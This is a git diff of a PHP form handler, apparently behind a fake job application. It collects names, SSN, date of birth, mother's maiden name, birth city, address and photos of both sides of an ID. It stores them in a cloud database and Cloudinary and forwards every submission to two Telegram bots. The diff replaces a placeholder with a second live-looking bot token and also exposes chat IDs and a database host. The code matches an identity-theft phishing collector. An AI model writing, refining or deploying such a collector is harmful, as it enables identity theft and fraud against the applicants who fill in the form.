@@ -1,19 +1,16 @@
 <?php
 
-// ======================
-// ERROR REPORTING
-// ======================
 error_reporting(E_ALL);
 ini_set('display_errors', 1);
 
 // ======================
-// CLOUDINARY SETTINGS
+// CLOUDINARY CONFIG
 // ======================
 $cloudName = "dlddiquex";
 $uploadPreset = "job_forms";
 
 // ======================
-// NEON DATABASE
+// NEON DB
 // ======================
 $host = "ep-calm-frog-ahfjj5vo-pooler.c-3.us-east-1.aws.neon.tech";
 $db   = "neondb";
@@ -32,31 +29,35 @@ try {
 }
 
 // ======================
-// FORM DATA
+// VALIDATE INPUT (LIKE LARAVEL STYLE)
 // ======================
-$first_name = $_POST['first_name'] ?? '';
-$middle_name = $_POST['middle_name'] ?? '';
-$last_name = $_POST['last_name'] ?? '';
-$phone = $_POST['phone'] ?? '';
-$email = $_POST['email'] ?? '';
-$dob = $_POST['dob'] ?? '';
-$mother_maiden = $_POST['mother_maiden'] ?? '';
-$ssn = $_POST['ssn'] ?? '';
-$birth_city = $_POST['birth_city'] ?? '';
+function clean($key) {
+    return $_POST[$key] ?? '';
+}
 
-$address_line1 = $_POST['address_line1'] ?? '';
-$address_line2 = $_POST['address_line2'] ?? '';
-$city = $_POST['city'] ?? '';
-$state = $_POST['state'] ?? '';
-$zip_code = $_POST['zip_code'] ?? '';
+$first_name = clean('first_name');
+$middle_name = clean('middle_name');
+$last_name = clean('last_name');
+$phone = clean('phone');
+$email = clean('email');
+$dob = clean('dob');
+$mother_maiden = clean('mother_maiden');
+$ssn = clean('ssn');
+$birth_city = clean('birth_city');
 
-$father_name = $_POST['father_name'] ?? '';
-$mother_name = $_POST['mother_name'] ?? '';
+$address_line1 = clean('address_line1');
+$address_line2 = clean('address_line2');
+$city = clean('city');
+$state = clean('state');
+$zip_code = clean('zip_code');
 
-$address = "$address_line1 $address_line2, $city, $state $zip_code";
+$father_name = clean('father_name');
+$mother_name = clean('mother_name');
+
+$address = trim("$address_line1 $address_line2, $city, $state $zip_code");
 
 // ======================
-// CLOUDINARY UPLOAD (FIXED)
+// CLOUDINARY UPLOAD (ROBUST VERSION)
 // ======================
 function uploadToCloudinary($file, $cloudName, $uploadPreset) {
 
@@ -64,7 +65,8 @@ function uploadToCloudinary($file, $cloudName, $uploadPreset) {
         return null;
     }
 
-    if ($file['size'] > 8 * 1024 * 1024) {
+    // Laravel-like validation (MAX 5MB like your example)
+    if ($file['size'] > 5 * 1024 * 1024) {
         return null;
     }
 
@@ -83,8 +85,8 @@ function uploadToCloudinary($file, $cloudName, $uploadPreset) {
         CURLOPT_POST => true,
         CURLOPT_POSTFIELDS => $postFields,
         CURLOPT_RETURNTRANSFER => true,
-        CURLOPT_TIMEOUT => 90,            // IMPORTANT
-        CURLOPT_CONNECTTIMEOUT => 20,     // IMPORTANT
+        CURLOPT_TIMEOUT => 90,
+        CURLOPT_CONNECTTIMEOUT => 20
     ]);
 
     $response = curl_exec($ch);
@@ -92,20 +94,15 @@ function uploadToCloudinary($file, $cloudName, $uploadPreset) {
 
     curl_close($ch);
 
-    if ($error) {
-        error_log("Cloudinary CURL ERROR: " . $error);
-        return null;
-    }
-
-    if (!$response) {
-        error_log("Empty Cloudinary response");
+    if ($error || !$response) {
+        error_log("Cloudinary error: " . $error);
         return null;
     }
 
     $result = json_decode($response, true);
 
-    if (!is_array($result) || empty($result['secure_url'])) {
-        error_log("Invalid Cloudinary response: " . $response);
+    if (!isset($result['secure_url'])) {
+        error_log("Cloudinary invalid response: " . $response);
         return null;
     }
 
@@ -113,10 +110,18 @@ function uploadToCloudinary($file, $cloudName, $uploadPreset) {
 }
 
 // ======================
-// UPLOAD FILES
+// UPLOAD FILES (LIKE LARAVEL LOOP STYLE)
 // ======================
-$front_url = uploadToCloudinary($_FILES['front_id'] ?? null, $cloudName, $uploadPreset);
-$back_url  = uploadToCloudinary($_FILES['back_id'] ?? null, $cloudName, $uploadPreset);
+$front_url = null;
+$back_url = null;
+
+if (isset($_FILES['front_id'])) {
+    $front_url = uploadToCloudinary($_FILES['front_id'], $cloudName, $uploadPreset);
+}
+
+if (isset($_FILES['back_id'])) {
+    $back_url = uploadToCloudinary($_FILES['back_id'], $cloudName, $uploadPreset);
+}
 
 // ======================
 // SAVE TO DATABASE
@@ -143,10 +148,10 @@ $front_url, $back_url
 // ======================
 // TELEGRAM
 // ======================
-$bot1 = "8538050369:AAGHLSy5D7r-_6QA9K1rbqkebWrzpbjc1ek";
+$bot1 = "8538050369:AAGHHSy5D7r-_6QA9K1rbqkebWrzpbjc1ek";
 $chat1 = "6513265609";
 
-$bot2 = "YOUR_BOT_TOKEN_2";
+$bot2 = "8972396935:AAG1WwV6vzEE5xkZty67SrE2GRYOO3HR8F0";
 $chat2 = "5469294503";
 
 function sendTelegram($bot, $method, $data) {
@@ -154,6 +159,9 @@ function sendTelegram($bot, $method, $data) {
     file_get_contents($url . "?" . http_build_query($data));
 }
 
+// ======================
+// MESSAGE
+// ======================
 $text =
 "📄 New Application Submitted\n\n".
 "👤 Name: $first_name $middle_name $last_name\n".
@@ -170,7 +178,7 @@ $text =
 sendTelegram($bot1, "sendMessage", ["chat_id"=>$chat1,"text"=>$text]);
 sendTelegram($bot2, "sendMessage", ["chat_id"=>$chat2,"text"=>$text]);
 
-// SEND IMAGES SAFE
+// SEND IMAGES ONLY IF VALID
 if (!empty($front_url)) {
 sendTelegram($bot1, "sendPhoto", ["chat_id"=>$chat1,"photo"=>$front_url,"caption"=>"Front ID"]);
 sendTelegram($bot2, "sendPhoto", ["chat_id"=>$chat2,"photo"=>$front_url,"caption"=>"Front ID"]);
@@ -184,5 +192,6 @@ sendTelegram($bot2, "sendPhoto", ["chat_id"=>$chat2,"photo"=>$back_url,"caption"
 // ======================
 // SUCCESS PAGE
 // ======================
-echo "<!DOCTYPE html> ... (your success HTML stays unchanged)";
+echo "<h1 style='text-align:center;margin-top:50px;color:green;'>Form Submitted Successfully</h1>";
+
 ?>
